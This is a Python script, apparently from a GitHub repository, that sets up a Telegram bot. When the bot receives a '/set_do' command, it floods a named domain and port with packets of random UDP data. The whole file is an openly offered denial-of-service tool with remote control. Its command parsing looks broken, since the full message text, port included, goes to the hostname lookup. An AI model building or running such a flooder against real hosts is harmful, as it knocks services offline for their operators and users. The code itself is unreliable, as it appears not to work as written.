# Main Script in : https://github.com/Zrexer/dd1
import socket 
import random 
import uuid
import telebot

def randomBytes():
    return random._urandom(1490)

def uid():
    return uuid.uuid4().hex

def start(ip, port, for_):
    num = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(for_):
            sock.sendto(randomBytes(), (ip, port))
            num += 1
    except Exception as e:
        return e
        pass

    finally:
        return num
    
tok = str(input("Enter Token > "))
app = telebot.TeleBot(tok)

@app.message_handler(content_types=['text'], chat_types=['private'])

def Main(msg):
    text = str(msg.text)
    
    if text.startswith('/set_do'):
        domain = text.replace('/set_do ', '')
        port = int(domain.split()[1])
        forx = str(domain.split()[3])
        
        domain_ = socket.gethostbyname(domain)
        
        app.reply_to(msg, f'Domain: {domain}\nPort: {port}\nIP: {domain_}')
        app.reply_to(msg, "Start Process ...")
        
        res = start(domain_, port, 1000 if forx == "" else int(forx))
        
        app.reply_to(msg, "Sended: {}".format(res))
        
        
        